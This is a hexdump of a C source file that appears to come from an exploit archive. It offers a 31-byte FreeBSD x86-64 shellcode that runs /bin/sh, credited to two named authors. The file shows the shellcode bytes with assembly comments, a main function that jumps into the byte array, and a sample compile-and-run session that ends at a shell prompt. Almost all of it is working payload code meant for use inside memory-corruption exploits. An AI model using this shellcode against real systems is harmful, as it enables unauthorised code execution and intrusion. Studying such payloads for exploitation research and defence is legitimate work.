00000000  2f 2a 2a 20 0d 0a 20 2a  0d 0a 20 2a 20 20 20 5f  |/** .. *.. *   _|
00000010  20 20 20 5f 20 20 20 20  20 20 20 20 20 20 20 20  |   _            |
00000020  5f 20 20 20 20 20 20 20  20 20 20 20 20 5f 5f 5f  |_            ___|
00000030  5f 20 20 20 20 20 20 20  5f 20 5f 20 0d 0a 20 2a  |_       _ _ .. *|
00000040  20 20 7c 20 7c 20 7c 20  7c 20 5f 5f 20 5f 20 20  |  | | | | __ _  |
00000050  5f 5f 5f 7c 20 7c 20 5f  5f 5f 20 5f 5f 20 20 20  |___| | ___ __   |
00000060  7c 20 20 5f 20 5c 20 5f  5f 5f 20 7c 20 7c 20 7c  ||  _ \ ___ | | ||
00000070  0d 0a 20 2a 20 20 7c 20  7c 5f 7c 20 7c 2f 20 5f  |.. *  | |_| |/ _|
00000080  60 20 7c 2f 20 5f 5f 7c  20 7c 2f 20 2f 20 27 5f  |` |/ __| |/ / '_|
00000090  20 5c 20 20 7c 20 7c 5f  29 20 2f 20 5f 20 5c 7c  | \  | |_) / _ \||
000000a0  20 7c 20 7c 0d 0a 20 2a  20 20 7c 20 20 5f 20 20  | | |.. *  |  _  |
000000b0  7c 20 28 5f 7c 20 7c 20  28 5f 5f 7c 20 20 20 3c  || (_| | (__|   <|
000000c0  7c 20 7c 20 7c 20 7c 20  7c 20 20 5f 20 3c 20 28  || | | | |  _ < (|
000000d0  5f 29 20 7c 20 7c 20 7c  0d 0a 20 2a 20 20 7c 5f  |_) | | |.. *  |_|
000000e0  7c 20 7c 5f 7c 5c 5f 5f  2c 5f 7c 5c 5f 5f 5f 7c  || |_|\__,_|\___||
000000f0  5f 7c 5c 5f 5c 5f 7c 20  7c 5f 7c 20 7c 5f 7c 20  |_|\_\_| |_| |_| |
00000100  5c 5f 5c 5f 5f 5f 2f 7c  5f 7c 5f 7c 0d 0a 20 2a  |\_\___/|_|_|.. *|
00000110  20 20 20 20 20 20 20 20  20 20 20 5b 20 68 74 74  |           [ htt|
00000120  70 3a 2f 2f 77 77 77 2e  68 61 63 6b 6e 72 6f 6c  |p://www.hacknrol|
00000130  6c 2e 63 6f 6d 20 5d 0d  0a 20 2a 0d 0a 20 2a 20  |l.com ].. *.. * |
00000140  44 65 73 63 72 69 70 74  69 6f 6e 3a 0d 0a 20 2a  |Description:.. *|
00000150  20 20 20 20 46 72 65 65  42 53 44 20 78 38 36 2d  |    FreeBSD x86-|
00000160  36 34 20 65 78 65 63 28  22 2f 62 69 6e 2f 73 68  |64 exec("/bin/sh|
00000170  22 29 20 53 68 65 6c 6c  63 6f 64 65 20 2d 20 33  |") Shellcode - 3|
00000180  31 20 62 79 74 65 73 0d  0a 20 2a 0d 0a 20 2a 0d  |1 bytes.. *.. *.|
00000190  0a 20 2a 0d 0a 20 2a 20  41 75 74 68 6f 72 73 3a  |. *.. * Authors:|
000001a0  0d 0a 20 2a 20 20 20 20  4d 61 79 63 6f 6e 20 4d  |.. *    Maycon M|
000001b0  2e 20 56 69 74 61 6c 69  20 28 20 30 75 74 30 66  |. Vitali ( 0ut0f|
000001c0  42 6f 75 6e 64 20 29 0d  0a 20 2a 20 20 20 20 20  |Bound ).. *     |
000001d0  20 20 20 4d 69 6c 77 30  72 6d 20 2e 3a 20 68 74  |   Milw0rm .: ht|
000001e0  74 70 3a 2f 2f 77 77 77  2e 6d 69 6c 77 30 72 6d  |tp://www.milw0rm|
000001f0  2e 63 6f 6d 2f 61 75 74  68 6f 72 2f 38 36 39 0d  |.com/author/869.|
00000200  0a 20 2a 20 20 20 20 20  20 20 20 50 61 67 65 20  |. *        Page |
00000210  2e 2e 2e 2e 3a 20 68 74  74 70 3a 2f 2f 6d 61 79  |....: http://may|
00000220  63 6f 6e 2e 68 61 63 6b  6e 72 6f 6c 6c 2e 63 6f  |con.hacknroll.co|
00000230  6d 0d 0a 20 2a 20 20 20  20 20 20 20 20 45 6d 61  |m.. *        Ema|
00000240  69 6c 20 2e 2e 2e 3a 20  6d 61 79 63 6f 6e 40 68  |il ...: maycon@h|
00000250  61 63 6b 6e 72 6f 6c 6c  2e 63 6f 6d 0d 0a 20 2a  |acknroll.com.. *|
00000260  0d 0a 20 2a 20 20 20 20  41 6e 64 65 72 73 6f 6e  |.. *    Anderson|
00000270  20 45 64 75 61 72 64 6f  20 28 20 63 30 64 33 5f  | Eduardo ( c0d3_|
00000280  7a 33 72 30 20 29 0d 0a  20 2a 20 20 20 20 20 20  |z3r0 ).. *      |
00000290  20 20 4d 69 6c 77 30 72  6d 20 2e 3a 20 68 74 74  |  Milw0rm .: htt|
000002a0  70 3a 2f 2f 77 77 77 2e  6d 69 6c 77 30 72 6d 2e  |p://www.milw0rm.|
000002b0  63 6f 6d 2f 61 75 74 68  6f 72 2f 31 35 37 30 0d  |com/author/1570.|
000002c0  0a 20 2a 20 20 20 20 20  20 20 20 50 61 67 65 20  |. *        Page |
000002d0  2e 2e 2e 2e 3a 20 68 74  74 70 3a 2f 2f 61 6e 64  |....: http://and|
000002e0  65 72 73 6f 6e 2e 68 61  63 6b 6e 72 6f 6c 6c 2e  |erson.hacknroll.|
000002f0  63 6f 6d 0d 0a 20 2a 20  20 20 20 20 20 20 20 45  |com.. *        E|
00000300  6d 61 69 6c 20 2e 2e 2e  3a 20 61 6e 64 65 72 73  |mail ...: anders|
00000310  6f 6e 40 68 61 63 6b 6e  72 6f 6c 6c 2e 63 6f 6d  |on@hacknroll.com|
00000320  0d 0a 20 2a 20 0d 0a 20  2a 20 2d 2d 2d 2d 2d 2d  |.. * .. * ------|
00000330  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00000360  2d 0d 0a 20 2a 20 20 20  0d 0a 20 2a 20 61 6d 64  |-.. *   .. * amd|
00000370  36 34 23 20 67 63 63 20  68 61 63 6b 6e 72 6f 6c  |64# gcc hacknrol|
00000380  6c 2e 63 20 2d 6f 20 68  61 63 6b 6e 72 6f 6c 6c  |l.c -o hacknroll|
00000390  0d 0a 20 2a 20 61 6d 64  36 34 23 20 2e 2f 68 61  |.. * amd64# ./ha|
000003a0  63 6b 6e 72 6f 6c 6c 0d  0a 20 2a 20 23 20 65 78  |cknroll.. * # ex|
000003b0  69 74 0d 0a 20 2a 20 61  6d 64 36 34 23 0d 0a 20  |it.. * amd64#.. |
000003c0  2a 0d 0a 20 2a 20 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |*.. * ----------|
000003d0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
000003f0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0d 0a 20  |-------------.. |
00000400  2a 2f 0d 0a 0d 0a 63 6f  6e 73 74 20 63 68 61 72  |*/....const char|
00000410  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 20 3d 0d 0a  | shellcode[] =..|
00000420  20 20 20 20 20 20 20 20  22 5c 78 34 38 5c 78 33  |        "\x48\x3|
00000430  31 5c 78 63 30 22 20 20  20 20 20 20 20 20 20 20  |1\xc0"          |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000450  20 20 20 20 20 2f 2f 20  78 6f 72 20 20 20 20 25  |     // xor    %|
00000460  72 61 78 2c 25 72 61 78  0d 0a 20 20 20 20 20 20  |rax,%rax..      |
00000470  20 20 22 5c 78 39 39 22  20 20 20 20 20 20 20 20  |  "\x99"        |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000004a0  2f 20 63 6c 74 64 0d 0a  20 20 20 20 20 20 20 20  |/ cltd..        |
000004b0  22 5c 78 62 30 5c 78 33  62 22 20 20 20 20 20 20  |"\xb0\x3b"      |
000004c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000004e0  6d 6f 76 20 20 20 20 24  30 78 33 62 2c 25 61 6c  |mov    $0x3b,%al|
000004f0  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 34 38 5c  |..        "\x48\|
00000500  78 62 66 5c 78 32 66 5c  78 32 66 5c 78 36 32 5c  |xbf\x2f\x2f\x62\|
00000510  78 36 39 5c 78 36 65 5c  78 32 66 5c 78 37 33 5c  |x69\x6e\x2f\x73\|
00000520  78 36 38 22 20 20 20 2f  2f 20 6d 6f 76 20 24 30  |x68"   // mov $0|
00000530  78 36 38 37 33 32 66 36  65 36 39 36 32 32 66 66  |x68732f6e69622ff|
00000540  66 2c 25 72 64 69 0d 0a  20 20 20 20 20 20 20 20  |f,%rdi..        |
00000550  22 5c 78 34 38 5c 78 63  31 5c 78 65 66 5c 78 30  |"\x48\xc1\xef\x0|
00000560  38 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |8"              |
00000570  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000580  73 68 72 20 20 20 20 24  30 78 38 2c 25 72 64 69  |shr    $0x8,%rdi|
00000590  0d 0a 20 20 20 20 20 20  20 20 22 5c 78 35 37 22  |..        "\x57"|
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000005c0  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
000005d0  20 25 72 64 69 0d 0a 20  20 20 20 20 20 20 20 22  | %rdi..        "|
000005e0  5c 78 34 38 5c 78 38 39  5c 78 65 37 22 20 20 20  |\x48\x89\xe7"   |
000005f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000600  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6d  |            // m|
00000610  6f 76 20 20 20 20 25 72  73 70 2c 25 72 64 69 0d  |ov    %rsp,%rdi.|
00000620  0a 20 20 20 20 20 20 20  20 22 5c 78 35 37 22 20  |.        "\x57" |
00000630  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000650  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
00000660  25 72 64 69 0d 0a 20 20  20 20 20 20 20 20 22 5c  |%rdi..        "\|
00000670  78 35 32 22 20 20 20 20  20 20 20 20 20 20 20 20  |x52"            |
00000680  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000690  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
000006a0  73 68 20 20 20 25 72 64  78 0d 0a 20 20 20 20 20  |sh   %rdx..     |
000006b0  20 20 20 22 5c 78 34 38  5c 78 38 39 5c 78 65 36  |   "\x48\x89\xe6|
000006c0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000006d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006e0  2f 2f 20 6d 6f 76 20 20  20 20 25 72 73 70 2c 25  |// mov    %rsp,%|
000006f0  72 73 69 0d 0a 20 20 20  20 20 20 20 20 22 5c 78  |rsi..        "\x|
00000700  30 66 5c 78 30 35 22 3b  20 20 20 20 20 20 20 20  |0f\x05";        |
00000710  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000720  20 20 20 20 20 20 20 20  20 20 2f 2f 20 73 79 73  |          // sys|
00000730  63 61 6c 6c 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |call....int main|
00000740  28 76 6f 69 64 29 0d 0a  7b 0d 0a 20 20 20 20 20  |(void)..{..     |
00000750  20 20 20 28 2a 28 76 6f  69 64 20 28 2a 29 28 29  |   (*(void (*)()|
00000760  29 20 73 68 65 6c 6c 63  6f 64 65 29 28 29 3b 0d  |) shellcode)();.|
00000770  0a 20 20 20 20 20 20 20  20 72 65 74 75 72 6e 20  |.        return |
00000780  30 3b 0d 0a 7d                                    |0;..}|
00000785
